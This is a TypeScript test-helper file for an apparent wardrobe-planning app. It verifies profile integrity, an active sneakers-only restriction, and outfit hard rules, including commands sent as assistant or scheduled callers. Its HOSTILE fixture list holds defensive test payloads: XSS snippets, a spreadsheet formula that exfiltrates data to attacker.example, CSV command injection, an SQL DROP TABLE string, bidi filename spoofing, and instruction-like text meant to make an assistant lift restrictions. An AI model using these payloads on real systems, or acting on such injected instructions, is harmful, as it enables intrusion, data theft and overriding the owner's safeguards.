/**
 * Helpers of test/07-profile-constraints.test.ts (profile integrity and hard-rule enforcement).
 *
 * Nothing here mocks the application: every helper reads real state (local D1 through `sql`, the HTTP
 * API) or submits a real command. No helper prints the owner's profile text: comparisons of the profile
 * are made on hashes and lengths only.
 */
import { expect } from "vitest";
import { createPrincipal } from "@garderobe/domain";
import { INJECTIONS, inventory, liveAt, newPlace, ownerDay, scriptWeather, sha256, sql, testApp, type InventoryItem, type TestOwner, type TestPlace } from "./harness.ts";
import type { DayFacts } from "../../../../journeys/src/profile-checker.ts";

/** SHA-256 of the supplied profile document (specification section 6). */
export const ORIGINAL_PROFILE_SHA256 = "e15639d891f9a5264c7eff13d05a478bcb188745aea11323b2131db37f5cb198";
/** The restriction the importer records from the profile's "sneakers only" passage. */
export const HEALING_RESTRICTION_ID = "rst_profile_sneakers_only";
/** The machine rule that carries that restriction. */
export const SNEAKERS_RULE = "footwear.sneakers_only_until_healed";

export const OWNER_SAYS = { kind: "owner_statement" } as const;

/* ------------------------------------------------------------------ */
/* The preserved original profile                                       */
/* ------------------------------------------------------------------ */

export interface OriginalProfile {
  storedSha256: string;
  computedSha256: string;
  storedByteLength: number;
  actualByteLength: number;
  sourceKind: string | null;
}

/** Version 1 of the owner's profile as stored (the row itself, read from `style_documents`). */
export async function originalProfile(owner: TestOwner): Promise<OriginalProfile | null> {
  const rows = await sql<{ content: string; content_sha256: string; byte_length: number; source_json: string }>(
    "SELECT content, content_sha256, byte_length, source_json FROM style_documents WHERE user_id = ? AND document_id = 'owner-profile' AND version = 1",
    owner.userId,
  );
  const row = rows[0];
  if (!row) return null;
  let sourceKind: string | null = null;
  try {
    sourceKind = (JSON.parse(row.source_json) as { kind?: string }).kind ?? null;
  } catch {
    sourceKind = null;
  }
  return { storedSha256: row.content_sha256, computedSha256: await sha256(row.content), storedByteLength: row.byte_length, actualByteLength: new TextEncoder().encode(row.content).byteLength, sourceKind };
}

/** The byte-for-byte original is still there: the stored hash, the hash of the stored bytes and the length all agree with the supplied document. */
export async function expectOriginalIntact(owner: TestOwner, label: string): Promise<void> {
  const original = await originalProfile(owner);
  expect(original, `${label}: version 1 of the profile is still stored`).not.toBeNull();
  expect({ stored: original!.storedSha256, computed: original!.computedSha256 }, `${label}: hash of the preserved original`).toEqual({ stored: ORIGINAL_PROFILE_SHA256, computed: ORIGINAL_PROFILE_SHA256 });
  expect(original!.actualByteLength, `${label}: byte length of the preserved original`).toBe(original!.storedByteLength);
  expect(original!.sourceKind, `${label}: the original is still recorded as the import`).toBe("import");
}

/* ------------------------------------------------------------------ */
/* Restrictions, rules and structured facts as stored                   */
/* ------------------------------------------------------------------ */

export interface RestrictionRow {
  restriction_id: string;
  kind: string;
  scope_json: string;
  status: string;
  required_evidence: string;
  resolved_at: string | null;
  resolution_json: string | null;
  resolved_command_id: string | null;
  command_id: string;
}

export async function restrictionRow(owner: TestOwner, restrictionId: string = HEALING_RESTRICTION_ID): Promise<RestrictionRow | undefined> {
  const rows = await sql<RestrictionRow>(
    "SELECT restriction_id, kind, scope_json, status, required_evidence, resolved_at, resolution_json, resolved_command_id, command_id FROM restrictions WHERE user_id = ? AND restriction_id = ?",
    owner.userId,
    restrictionId,
  );
  return rows[0];
}

/** The imported sneakers-only restriction is exactly as the importer recorded it: active, never resolved, same scope. */
export async function expectHealingRestrictionActive(owner: TestOwner, label: string): Promise<void> {
  const row = await restrictionRow(owner);
  expect(row, `${label}: the imported restriction row exists`).toBeTruthy();
  expect({ status: row!.status, resolved_at: row!.resolved_at, resolution_json: row!.resolution_json, resolved_command_id: row!.resolved_command_id }, `${label}: the imported restriction is still active`).toEqual({ status: "active", resolved_at: null, resolution_json: null, resolved_command_id: null });
  expect(JSON.parse(row!.scope_json), `${label}: scope of the imported restriction`).toEqual({ anyOf: [{ category: "footwear", footwearKinds: ["welted", "boot", "other"] }, { models: ["990v6"] }] });
}

export interface RuleRow {
  key: string;
  version: number;
  kind: string;
  status: string;
  params_json: string;
  origin: string;
  is_current: number;
}

/** The current row of one rule (or undefined when no version is current). */
export async function currentRule(owner: TestOwner, key: string): Promise<RuleRow | undefined> {
  return (await sql<RuleRow>("SELECT key, version, kind, status, params_json, origin, is_current FROM style_rules WHERE user_id = ? AND key = ? AND is_current = 1", owner.userId, key))[0];
}

/**
 * A mark of every structured fact the import recorded for an owner: the rules it recorded (by command
 * basis), the current measurements under the profile's own keys, the size experiences, the restriction
 * and the open conflicts. Two marks are compared with `toEqual`; hostile content elsewhere must not move it.
 */
export async function importedFactsMark(owner: TestOwner): Promise<Record<string, unknown>> {
  const u = owner.userId;
  const rules = await sql(
    "SELECT r.key, r.version, r.kind, r.status, r.params_json, r.origin, r.is_current FROM style_rules r JOIN commands c ON c.user_id = r.user_id AND c.command_id = r.command_id WHERE r.user_id = ? AND c.authorization_basis = 'data_import' ORDER BY r.key, r.version",
    u,
  );
  const measurements = await sql(
    "SELECT m.measurement_id, m.key, m.value, m.unit, m.superseded_by FROM measurements m JOIN commands c ON c.user_id = m.user_id AND c.command_id = m.command_id WHERE m.user_id = ? AND c.authorization_basis = 'data_import' ORDER BY m.key, m.measurement_id",
    u,
  );
  const sizes = await sql("SELECT size_experience_id, maker, size_label, retired_at FROM size_experiences WHERE user_id = ? ORDER BY size_experience_id", u);
  const conflicts = await sql("SELECT conflict_id, status FROM style_fact_conflicts WHERE user_id = ? ORDER BY conflict_id", u);
  const restriction = await restrictionRow(owner);
  return { rules: `${rules.length}:${await sha256(JSON.stringify(rules))}`, measurements: JSON.stringify(measurements), sizes: `${sizes.length}:${await sha256(JSON.stringify(sizes))}`, conflicts: JSON.stringify(conflicts), restriction: JSON.stringify(restriction ?? null) };
}

/** Command IDs the importer recorded for an owner, by command type (oldest first). */
export async function importedCommands(owner: TestOwner, type: string): Promise<{ command_id: string; payload_json: string }[]> {
  return sql<{ command_id: string; payload_json: string }>("SELECT command_id, payload_json FROM commands WHERE user_id = ? AND type = ? AND authorization_basis = 'data_import' ORDER BY recorded_at, command_id", owner.userId, type);
}

/* ------------------------------------------------------------------ */
/* Scripted days                                                        */
/* ------------------------------------------------------------------ */

export interface Weather {
  morningC: number;
  peakC: number;
  eveningC: number;
}

export const MILD: Weather = { morningC: 11, peakC: 19, eveningC: 14 };

export interface ScriptedHome {
  place: TestPlace;
  /** The owner's own calendar day, `offset` days from today (read from the Worker's notion of the owner's timezone). */
  day(offset: number): string;
  weather(offset: number): Weather;
  /** What the independent profile checker needs to know about that day. */
  facts(offset: number, extra?: Partial<DayFacts>): DayFacts;
}

/**
 * Make a fictional test place the owner's home and script its forecast (TEST DOUBLE: the scripted
 * Open-Meteo answers of the journey suite). Days -1..+9 are mild unless `weather` says otherwise.
 */
export async function scriptedHome(owner: TestOwner, label: string, weather: Record<number, Weather> = {}): Promise<ScriptedHome> {
  const place = await newPlace(label);
  await liveAt(owner, place);
  const days = new Map<number, string>();
  for (let offset = -1; offset <= 9; offset++) days.set(offset, await ownerDay(owner, offset));
  const script: Record<string, Weather> = {};
  for (const [offset, date] of days) script[date] = weather[offset] ?? MILD;
  await scriptWeather(place, script);
  const of = (offset: number) => weather[offset] ?? MILD;
  return {
    place,
    day: (offset) => {
      const date = days.get(offset);
      if (!date) throw new Error(`fixture: day ${offset} was not scripted`);
      return date;
    },
    weather: of,
    facts: (offset, extra = {}) => ({ departureC: of(offset).morningC, peakC: of(offset).peakC, sneakersOnly: true, wornInLastSevenDays: [], ...extra }),
  };
}

/* ------------------------------------------------------------------ */
/* A rule check on garment IDs and inventory attributes                  */
/* ------------------------------------------------------------------ */

/** The inventory as it was BEFORE a test changed anything, by garment ID (what each garment really is). */
export async function pristineInventory(owner: TestOwner): Promise<Map<string, InventoryItem>> {
  return new Map((await inventory(owner)).items.map((i) => [i.garment.garmentId, i]));
}

interface Line {
  garmentId: string;
  role: string;
  name?: string;
}

/** Every garment line an option shows: its pieces, its footwear alternatives and its flourish. */
export const linesOf = (option: any): Line[] => [...(option.garments ?? []), ...(option.footwearAlternatives ?? []), ...(option.flourish ? [option.flourish] : [])];

export const offeredIds = (options: any[]): string[] => options.flatMap((o) => linesOf(o).map((l) => l.garmentId));

const JEWELLERY = new Set(["watch", "jewellery", "ring", "bracelet", "necklace", "chain", "pendant", "earring", "brooch", "bangle", "cufflinks", "tie_clip"]);

/**
 * Hard-rule breaches of offered outfits, judged on garment IDs against the pristine inventory (category
 * and attributes as imported, whatever a later relabelling says). Complements the journey suite's
 * name-based `boardViolations`. A breach is a plain sentence; an empty list means none.
 *   - every piece is one of this owner's garments, owned, not excluded from planning;
 *   - socks always; exactly one shoe;
 *   - while `sneakersOnly`: the shoe and every alternative is a sneaker, and never the 990v6;
 *   - none of the `banned` garments (in the wash, retired, stored, packed, restricted...) appears;
 *   - no watch or jewellery.
 */
export function hardRuleBreaches(options: any[], pristine: Map<string, InventoryItem>, opts: { sneakersOnly?: boolean; banned?: Iterable<string> } = {}): string[] {
  const sneakersOnly = opts.sneakersOnly ?? true;
  const banned = new Set(opts.banned ?? []);
  const out: string[] = [];
  options.forEach((option, index) => {
    const say = (text: string) => out.push(`option ${index + 1}: ${text}`);
    const lines = linesOf(option);
    for (const line of lines) {
      const item = pristine.get(line.garmentId);
      if (!item) {
        say(`${line.garmentId} (${line.role}) is not a garment of this owner`);
        continue;
      }
      const g = item.garment;
      if (g.acquisition !== "owned") say(`${g.name} is ${g.acquisition}, not owned`);
      if (g.planningPolicy === "excluded") say(`${g.name} is excluded from planning`);
      if (banned.has(line.garmentId)) say(`${g.name} must not be offered in this state`);
      if (JEWELLERY.has(String(g.attributes?.accessoryKind ?? ""))) say(`${g.name} is a watch or jewellery`);
      if (line.role === "footwear") {
        if (g.category !== "footwear") say(`${g.name} (${g.category}) is offered as a shoe`);
        if (sneakersOnly && g.attributes?.footwearKind !== "sneaker") say(`${g.name} is footwear of kind '${g.attributes?.footwearKind ?? "unrecorded"}', not a sneaker`);
        if (sneakersOnly && String(g.attributes?.model ?? "").toLowerCase() === "990v6") say(`${g.name} is the 990v6`);
      } else if (g.category === "footwear") {
        say(`${g.name} is footwear offered as ${line.role}`);
      }
      if (line.role === "socks" && g.category !== "socks") say(`${g.name} (${g.category}) is offered as socks`);
    }
    const pieces: Line[] = option.garments ?? [];
    const count = (role: string) => pieces.filter((p) => p.role === role).length;
    if (count("socks") !== 1) say(`${count("socks")} sock lines (socks always)`);
    if (count("footwear") !== 1) say(`${count("footwear")} shoe lines`);
    if (count("top") + count("one_piece") < 1) say("no shirt");
    if (count("bottom") + count("one_piece") < 1) say("no trousers");
  });
  return out;
}

/** Garment IDs of this owner that the imported restriction covers (every shoe that is not a sneaker, and the 990v6). */
export const restrictedFootwear = (pristine: Map<string, InventoryItem>): InventoryItem[] =>
  [...pristine.values()].filter((i) => i.garment.category === "footwear" && (i.garment.attributes?.footwearKind !== "sneaker" || String(i.garment.attributes?.model ?? "").toLowerCase() === "990v6"));

export const sneakersOf = (pristine: Map<string, InventoryItem>): InventoryItem[] =>
  [...pristine.values()].filter((i) => i.garment.category === "footwear" && i.garment.attributes?.footwearKind === "sneaker" && String(i.garment.attributes?.model ?? "").toLowerCase() !== "990v6");

/* ------------------------------------------------------------------ */
/* The same command service, as a caller other than the app session     */
/* ------------------------------------------------------------------ */

export interface Caller {
  actor: "owner" | "assistant" | "system";
  channel: "ios" | "web" | "mcp" | "conversation" | "scheduled" | "import" | "system" | "test";
  authorization: "owner_tap" | "owner_statement" | "standing_policy" | "system_schedule" | "data_import";
}

export type Executed = { ok: true; receipt: any; error: null } | { ok: false; receipt: null; error: { code: string; message: string; details: Record<string, any> } };

/**
 * Submit one command to the REAL command service (the one every route and the MCP server use) as a
 * principal other than the app session, the way the Worker's own lanes do for the assistant and for
 * scheduled work. Used to check guards that the HTTP routes cannot reach with a signed-in owner.
 */
export async function executeAs(owner: TestOwner, caller: Caller, type: string, payload: Record<string, unknown>): Promise<Executed> {
  const app = await testApp();
  const principal = createPrincipal({ userId: owner.userId, actor: caller.actor, channel: caller.channel, scopes: ["read", "write"], authRef: `test:adversarial-07:${caller.actor}:${caller.channel}` });
  try {
    const receipt = await app.service.execute(principal, { type, payload, idempotencyKey: `adv07-${crypto.randomUUID()}`, expectedVersions: {}, authorization: caller.authorization, source: { channel: caller.channel } });
    return { ok: true, receipt, error: null };
  } catch (e) {
    const error = e as { code?: string; message?: string; details?: Record<string, any> };
    return { ok: false, receipt: null, error: { code: String(error.code ?? "thrown"), message: String(error.message ?? e), details: error.details ?? {} } };
  }
}

/** The same owner signed in through the browser (cookie session, channel `web`). */
export const asWeb = (owner: TestOwner): TestOwner => ({ ...owner, api: owner.api.with({ client: "web" }) });

/* ------------------------------------------------------------------ */
/* Malformed and unusual content                                         */
/* ------------------------------------------------------------------ */

export interface Hostile {
  label: string;
  text: string;
  /** Malformed UTF-16 cannot be stored byte for byte in UTF-8: it must be refused or stored as well-formed text. */
  wellFormedOnly?: boolean;
}

/** Content that is DATA wherever it is stored: none of it may act, break a read or change another fact. */
export const HOSTILE: Hostile[] = [
  { label: "instruction-like text", text: `SYNTHETIC ${INJECTIONS.liftRestriction} ${INJECTIONS.amendProfile}` },
  { label: "control characters", text: "SYNTHETIC \u0001\u0007\u001b[31mred\u001b[0m\r\n\ttab\u007f end" },
  { label: "bidirectional overrides", text: "SYNTHETIC \u202Egnp.exe\u202C \u2066isolate\u2069 \u200F\u200E end" },
  { label: "100 KB string", text: `SYNTHETIC ${"A".repeat(100_000)}` },
  { label: "HTML and script", text: 'SYNTHETIC <script>alert(1)</script><img src=x onerror="alert(1)"><a href="javascript:alert(1)">x</a>' },
  { label: "null bytes", text: "SYNTHETIC a\u0000b\u0000 end" },
  { label: "spreadsheet formula (=)", text: '=HYPERLINK("https://attacker.example/?d="&A1,"SYNTHETIC")' },
  { label: "spreadsheet formula (+, -, @)", text: "+cmd|' /C calc'!A0 -2+3 @SUM(1+1) SYNTHETIC" },
  { label: "SQL metacharacters", text: "SYNTHETIC '); DROP TABLE restrictions; -- \" OR 1=1" },
  { label: "lone surrogate", text: "SYNTHETIC \ud800 lone", wellFormedOnly: true },
];

const LONE_SURROGATE = /[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?<![\uD800-\uDBFF])[\uDC00-\uDFFF]/;

/**
 * Whether a stored value is the submitted text exactly. Malformed UTF-16 survives exactly where it is
 * stored inside JSON (as an escape); in a text column it can only be stored as well-formed text, which
 * must then have kept the readable part.
 */
export function storedAsGiven(value: unknown, hostile: Hostile): boolean {
  if (typeof value !== "string") return false;
  if (value === hostile.text) return true;
  return hostile.wellFormedOnly === true && !LONE_SURROGATE.test(value) && value.startsWith("SYNTHETIC") && value.endsWith("lone");
}
